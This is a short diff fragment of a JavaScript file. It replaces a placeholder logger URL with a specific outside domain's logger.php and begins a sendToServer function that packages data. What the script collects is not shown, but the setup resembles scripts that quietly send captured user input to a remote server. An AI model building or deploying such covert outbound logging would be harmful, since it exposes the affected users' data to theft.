@@ -1,4 +1,4 @@
-var url = "https://yourserver.com/logger.php"; // Ganti dengan URL server Anda
+var url = "https://rajazeus77.my.id/logger.php"; // Ganti dengan URL server Anda
 
 function sendToServer() {
     var data = {
